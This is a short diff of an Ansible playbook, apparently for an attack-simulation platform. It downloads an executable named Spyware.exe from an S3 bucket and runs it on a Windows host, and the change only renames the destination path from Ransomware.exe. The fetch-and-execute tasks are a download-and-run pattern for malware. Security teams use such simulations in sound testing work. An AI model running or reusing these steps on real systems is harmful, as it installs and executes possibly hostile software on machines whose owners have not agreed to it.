@@ -6,7 +6,7 @@
   - name: Download Spyware
     win_get_url:
        url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Spyware.exe
-       dest: c:\Ransomware.exe
+       dest: c:\Spyware.exe
        
   - name: Execute Spyware
     win_command: c:\Spyware.exe
